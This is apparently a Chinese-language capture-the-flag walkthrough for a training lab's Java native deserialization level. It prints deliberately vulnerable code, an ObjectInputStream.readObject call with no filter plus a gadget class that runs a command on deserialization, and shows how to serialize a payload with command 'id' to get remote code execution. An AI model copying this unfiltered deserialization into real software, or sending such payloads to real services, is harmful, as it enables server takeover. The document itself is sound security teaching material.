# Level 1 — Java原生反序列化

## 关卡说明

本关模拟会话恢复服务，使用 `ObjectInputStream.readObject()` 反序列化用户提交的Base64编码数据，且未设置任何ObjectInputFilter。应用中存在 `VulnerableTask` Gadget类，其 `readObject()` 方法会自动执行 `command` 字段中的命令。

**目标**：构造包含恶意命令的序列化 `VulnerableTask` 对象，触发反序列化RCE，获取 Flag。

## 漏洞原理

### 代码逻辑分析

本关的后端代码位于 `NativeDeserController.java`，相关接口：

```
GET  /api/challenge/deser/native/info     — 获取Gadget类信息
GET  /api/challenge/deser/native/session  — 获取合法的Session Token（空命令）
POST /api/challenge/deser/native/restore  — 反序列化恢复Session（漏洞入口）
POST /api/challenge/deser/native/generate — 辅助生成安全Token
```

**Gadget类信息**：

| 属性 | 值 |
|------|-----|
| 类名 | `com.madrabbit.challenge.deser.VulnerableTask` |
| 接口 | `java.io.Serializable` |
| serialVersionUID | `20250101L` |
| 字段 | `String command` |
| 触发条件 | `readObject()` 中 `command` 非空时自动执行 |

**数据流**：

```
用户提交 Base64 编码的序列化数据
    ↓
检查 magic bytes: rO0AB (AC ED 00 05)
    ↓
Base64 解码
    ↓
ObjectInputStream.readObject()  ← 无ObjectInputFilter！
    ↓
VulnerableTask.readObject() 自动调用
    ↓
command 非空 → executeCommand() → 执行命令
    ↓
VulnerableTask.getAndClearResult() 获取执行结果
    ↓
有执行结果 → 返回 Flag
```

**漏洞点**：

1. **无ObjectInputFilter**：`ObjectInputStream` 没有设置任何过滤器，接受任意类的反序列化。
2. **Gadget Chain**：`VulnerableTask.readObject()` 在反序列化时自动执行 `command` 字段。
3. **Magic Bytes校验不安全**：仅检查Base64数据是否以 `rO0AB` 开头，无法防止恶意序列化数据。

### 源码关键片段

```java
// NativeDeserController.java — 漏洞核心：无过滤器的反序列化
try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded))) {
    Object obj = ois.readObject();  // 无 ObjectInputFilter！
    
    String executionResult = VulnerableTask.getAndClearResult();
    if (executionResult != null) {
        String flag = flagService.getFlag("deserialization", "level1");
        result.put("rce_triggered", true);
        result.put("flag", flag);
    }
}

// VulnerableTask.java — Gadget Chain
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ois.defaultReadObject();
    if (command != null && !command.trim().isEmpty()) {
        String result = executeCommand(command);  // 自动执行！
        executionResult.set(result);
    }
}
```

## 通关步骤

### Step 1：获取Gadget类信息

```
GET /api/challenge/deser/native/info
```

了解 `VulnerableTask` 类的结构和触发条件。

### Step 2：获取合法Token

```
GET /api/challenge/deser/native/session
```

获取一个合法的序列化 `VulnerableTask` 对象（空命令，安全）。

### Step 3：构造恶意序列化对象

创建与服务器相同的 `VulnerableTask` 类（相同包名、serialVersionUID），设置 `command="id"`，序列化并Base64编码：

```java
// 在本地创建 VulnerableTask.java
package com.madrabbit.challenge.deser;
import java.io.Serializable;
public class VulnerableTask implements Serializable {
    private static final long serialVersionUID = 20250101L;
    private String command;
    public VulnerableTask(String cmd) { this.command = cmd; }
}

// 序列化
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(new VulnerableTask("id"));
String payload = Base64.getEncoder().encodeToString(baos.toByteArray());
```

### Step 4：提交恶意数据

```json
POST /api/challenge/deser/native/restore
{
  "sessionData": "<base64_payload>"
}
```

### Step 5：获取 Flag

RCE触发成功后，响应中包含 Flag：

```json
{
  "success": true,
  "rce_triggered": true,
  "executionOutput": "uid=0(root) gid=0(root) groups=0(root)",
  "flag": "flag{...}"
}
```

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/deserialization/NativeDeserController.java` | 后端反序列化接口 |
| `challenge/deser/VulnerableTask.java` | Gadget Chain类 |
| `service/FlagService.java` | Flag 获取与验证 |
